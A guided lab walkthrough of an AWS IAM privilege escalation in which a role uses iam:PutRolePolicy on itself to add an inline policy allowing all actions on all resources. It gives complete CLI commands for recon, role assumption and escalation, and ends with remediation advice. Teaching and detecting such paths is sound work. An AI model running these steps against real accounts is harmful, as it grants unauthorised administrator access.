# Guided Walkthrough: Self-Escalation Privilege Escalation via iam:PutRolePolicy

This scenario demonstrates a privilege escalation vulnerability where a role can modify its own inline policies using `iam:PutRolePolicy`. The attacker starts with minimal permissions but can grant themselves administrator access by adding an inline policy to their own role.

This class of misconfiguration is surprisingly common in real AWS environments. Teams often grant `iam:PutRolePolicy` to a role so that an application or CI/CD pipeline can manage its own permissions dynamically — without realizing that "manage its own permissions" is functionally equivalent to "grant itself anything." Because the action targets the same role that holds the permission, there is no second principal required to complete the escalation.

## The Challenge

You start with access to the IAM user `pl-prod-iam-005-to-admin-starting-user`. This user has permission to assume `pl-prod-iam-005-to-admin-starting-role`. The starting role holds `iam:PutRolePolicy` scoped to itself. Your goal is to reach effective administrator access within the account.

- **Starting principal:** `arn:aws:iam::{account_id}:user/pl-prod-iam-005-to-admin-starting-user`
- **Target:** effective administrator (via `pl-prod-iam-005-to-admin-starting-role` with an added inline policy)

## Reconnaissance

First, establish who you are and what the starting user can do:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

Next, check what roles this user can assume:

```bash
aws iam list-attached-user-policies --user-name pl-prod-iam-005-to-admin-starting-user
aws iam list-user-policies --user-name pl-prod-iam-005-to-admin-starting-user
```

Once you have assumed the starting role (see Exploitation below), you can inspect what permissions the role has on itself:

```bash
aws iam list-role-policies --role-name pl-prod-iam-005-to-admin-starting-role
aws iam get-role-policy --role-name pl-prod-iam-005-to-admin-starting-role --policy-name <policy-name>
```

You will find a policy that grants `iam:PutRolePolicy` with the resource restricted to the role's own ARN. That is all you need.

## Exploitation

### Step 1: Assume the starting role

```bash
CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-005-to-admin-starting-role \
  --role-session-name escalation-session \
  --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
  --output text)

export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | awk '{print $1}')
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | awk '{print $2}')
export AWS_SESSION_TOKEN=$(echo "$CREDS" | awk '{print $3}')

aws sts get-caller-identity
```

You are now operating as the starting role.

### Step 2: Add an inline administrator policy to the role

Because the role has `iam:PutRolePolicy` on itself, you can use it to write a new inline policy granting full administrative access:

```bash
aws iam put-role-policy \
  --role-name pl-prod-iam-005-to-admin-starting-role \
  --policy-name escalation-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }
    ]
  }'
```

IAM policy changes propagate within a few seconds. Wait briefly before proceeding.

## Verification

Confirm that the role now has administrator access by calling an API that requires elevated permissions:

```bash
aws iam list-users
```

If the call returns a list of IAM users, escalation succeeded. The role now has effective `AdministratorAccess` within the account.

## What Happened

You exploited a self-referential permission: the role had `iam:PutRolePolicy` scoped to its own ARN. A single API call rewrote the role's permissions without needing any other principal to approve or facilitate the change. No external resource, no second account, no trust relationship — just the role acting on itself.

In real environments this pattern appears when teams build automation that needs to manage its own IAM surface, or when a role is granted broad `iam:*` permissions "for convenience." The fix is straightforward: never grant an IAM principal the ability to modify its own policies or trust relationships, and use IAM Access Analyzer or a pathfinding tool to detect these self-referential escalation edges before attackers do.
